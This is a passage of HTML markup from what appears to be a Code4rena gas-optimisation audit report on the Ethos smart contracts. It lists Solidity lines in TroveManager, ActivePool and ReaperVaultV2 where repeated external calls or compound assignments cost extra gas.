class=\"mtk1\">.</span><span class=\"mtk11\">decreaseTroveColl</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collChange</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">470</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newDebt</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">_isDebtIncrease</span><span class=\"mtk1\">) ? </span><span class=\"mtk12\">_troveManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseTroveDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_debtChange</span><span class=\"mtk1\">): </span><span class=\"mtk7\">471</span><span class=\"mtk1\">:</span><span class=\"mtk12\">_troveManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decreaseTroveDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_debtChange</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getTroveStatus(_borrower, _collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">542</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">status</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_troveManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTroveStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getTroveStatus(_borrower, _collateral);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">547</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">status</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_troveManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTroveStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L420\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L420</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"142\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">420</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralCCR(_collateral) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">521</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collCCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralCCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">522</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralMCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">523</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collMCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralMCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: fetchPrice(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">524</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceFeed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fetchPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getTotalLUSDDeposits();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">525</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LUSDInStabPool</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stabilityPoolCached</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTotalLUSDDeposits</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">596</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralCCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">597</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collCCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralCCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralMCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">598</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collMCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralMCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getLast(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">606</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_sortedTroves</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getLast</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getFirst(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">607</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">firstUser</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_sortedTroves</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getFirst</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getPrev(_collateral, vars.user)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">610</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nextUser</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_sortedTroves</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPrev</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getLast(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">691</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">sortedTrovesCached</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getLast</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">725</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralCCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">726</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collCCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralCCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralMCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">727</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collMCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralMCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: fetchPrice(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">728</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceFeed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fetchPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getTotalLUSDDeposits()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">729</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LUSDInStabPool</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stabilityPoolCached</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTotalLUSDDeposits</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">798</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralCCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">799</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collCCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralCCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralMCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">800</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collMCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralMCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1048</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1061</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1131</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1146</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateral(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1308</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">activeColl</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_activePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateral(_collateral);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1309</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidatedColl</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">defaultPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1362</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralCCR(_collateral);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1367</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collCCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralCCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1368</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L105\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L105</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"143\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ActivePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getAllowedCollaterals()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ICollateralConfig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralConfigAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getAllowedCollaterals</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: asset()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IERC4626</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Vault asset must be collateral&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: isCollateralAllowed(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">315</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">ICollateralConfig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralConfigAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">isCollateralAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: redemptionHelper()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">328</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">redemptionHelper</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ITroveManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">troveManagerAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">redemptionHelper</span><span class=\"mtk1\">());</span></span></span></code></pre>\n<h2 id=\"x--y-costs-more-gas-than-x--x--y-for-state-variables\" style=\"position:relative;\"><a href=\"#x--y-costs-more-gas-than-x--x--y-for-state-variables\" aria-label=\"x  y costs more gas than x  x  y for state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>x += y costs more gas than x = x + y for state variables</h2>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L168\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L168</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"144\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">168</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalAllocBPS</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">_allocBPS</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span 